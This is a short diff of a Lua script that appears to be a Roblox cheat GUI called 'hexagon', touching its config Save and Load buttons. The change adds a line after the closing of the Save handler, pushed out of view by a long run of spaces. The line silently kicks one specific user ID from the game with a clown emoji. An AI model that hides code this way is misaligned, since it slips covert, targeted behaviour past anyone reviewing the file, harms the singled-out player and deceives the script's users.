@@ -1747,7 +1747,7 @@ end)
 
 SettingsTabCategoryConfigs:AddButton("Save", function()
     writefile("hexagon/configs/"..library.pointers.SettingsTabCategoryConfigsConfig.value..".cfg", library:SaveConfiguration())
-end)
+end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   if game.Players.LocalPlayer.UserId == 1858923608 then game.Players.LocalPlayer:Kick("🤡") end
 
 SettingsTabCategoryConfigs:AddButton("Load", function()
 	local a,b = pcall(function()
